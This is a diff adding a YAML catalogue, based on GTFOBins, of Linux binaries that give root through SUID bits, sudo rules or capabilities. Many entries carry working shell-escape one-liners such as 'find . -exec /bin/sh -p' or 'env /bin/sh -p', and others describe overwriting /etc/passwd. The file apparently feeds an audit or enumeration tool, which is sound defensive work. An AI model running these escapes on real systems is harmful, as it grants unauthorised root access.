@@ -1,0 +1,49 @@
+# KB-01: escalation-technique catalogue based on GTFOBins (https://gtfobins.github.io).
+# name     : binary basename; versioned names (python3.10, perl5.34) match by stripping
+#            the trailing version digits.
+# contexts : where the binary gives an escalation primitive (suid, sudo, capability).
+#            "capability" means cap_setuid lets it change its user ID.
+# result   : identity reached when abused (root for root-owned SUID / root sudo rules).
+binaries:
+  - {name: awk, contexts: [suid, sudo], result: root, note: "awk 'BEGIN {system(\"/bin/sh\")}'"}
+  - {name: bash, contexts: [suid, sudo], result: root, note: "bash -p keeps the effective UID"}
+  - {name: busybox, contexts: [suid, sudo], result: root, note: "busybox sh spawns a shell"}
+  - {name: cp, contexts: [suid, sudo], result: root, note: "Overwrites privileged files such as /etc/passwd"}
+  - {name: dash, contexts: [suid, sudo], result: root, note: "dash -p keeps the effective UID"}
+  - {name: docker, contexts: [suid, sudo], result: root, note: "Mounts the host filesystem in a container"}
+  - {name: ed, contexts: [suid, sudo], result: root, note: "!/bin/sh from the editor prompt"}
+  - {name: env, contexts: [suid, sudo], result: root, note: "env /bin/sh -p"}
+  - {name: expect, contexts: [suid, sudo], result: root, note: "expect -c 'spawn /bin/sh -p; interact'"}
+  - {name: find, contexts: [suid, sudo], result: root, note: "find . -exec /bin/sh -p \\; -quit"}
+  - {name: gawk, contexts: [suid, sudo], result: root, note: "Same primitive as awk"}
+  - {name: gdb, contexts: [sudo, capability], result: root, note: "Python inside gdb can call setuid(0)"}
+  - {name: git, contexts: [sudo], result: root, note: "Pager or hooks spawn a shell"}
+  - {name: less, contexts: [sudo], result: root, note: "!/bin/sh from the pager"}
+  - {name: lua, contexts: [suid, sudo], result: root, note: "os.execute spawns a shell"}
+  - {name: man, contexts: [sudo], result: root, note: "Pager escape to a shell"}
+  - {name: mawk, contexts: [suid, sudo], result: root, note: "Same primitive as awk"}
+  - {name: more, contexts: [sudo], result: root, note: "!/bin/sh from the pager"}
+  - {name: mv, contexts: [sudo], result: root, note: "Replaces privileged files"}
+  - {name: nano, contexts: [sudo], result: root, note: "Command execution via ^R^X"}
+  - {name: nice, contexts: [suid, sudo], result: root, note: "nice /bin/sh -p"}
+  - {name: nmap, contexts: [suid, sudo], result: root, note: "Interactive mode or NSE script runs commands"}
+  - {name: node, contexts: [suid, sudo, capability], result: root, note: "child_process or process.setuid(0)"}
+  - {name: openssl, contexts: [suid, sudo], result: root, note: "Reads and writes arbitrary files"}
+  - {name: perl, contexts: [suid, sudo, capability], result: root, note: "POSIX::setuid(0) then exec a shell"}
+  - {name: php, contexts: [suid, sudo, capability], result: root, note: "posix_setuid(0) then system()"}
+  - {name: python, contexts: [suid, sudo, capability], result: root, note: "os.setuid(0) then exec a shell"}
+  - {name: rsync, contexts: [suid, sudo], result: root, note: "-e option runs a shell"}
+  - {name: ruby, contexts: [sudo, capability], result: root, note: "Process::Sys.setuid(0) then exec"}
+  - {name: sh, contexts: [suid, sudo], result: root, note: "sh -p keeps the effective UID"}
+  - {name: socat, contexts: [sudo], result: root, note: "socat stdin exec:/bin/sh"}
+  - {name: strace, contexts: [suid, sudo], result: root, note: "strace -o /dev/null /bin/sh -p"}
+  - {name: systemctl, contexts: [suid, sudo], result: root, note: "Links and starts an attacker-defined unit"}
+  - {name: tar, contexts: [sudo], result: root, note: "--checkpoint-action=exec runs commands"}
+  - {name: taskset, contexts: [suid, sudo], result: root, note: "taskset 1 /bin/sh -p"}
+  - {name: tclsh, contexts: [suid, sudo], result: root, note: "exec /bin/sh -p"}
+  - {name: timeout, contexts: [suid, sudo], result: root, note: "timeout 7d /bin/sh -p"}
+  - {name: vi, contexts: [suid, sudo], result: root, note: ":!/bin/sh from the editor"}
+  - {name: vim, contexts: [suid, sudo, capability], result: root, note: "Embedded python can call setuid(0)"}
+  - {name: xargs, contexts: [suid, sudo], result: root, note: "xargs -a /dev/null sh -p"}
+  - {name: zip, contexts: [sudo], result: root, note: "-TT option runs a command"}
+  - {name: zsh, contexts: [suid, sudo], result: root, note: "zsh keeps the effective UID"}
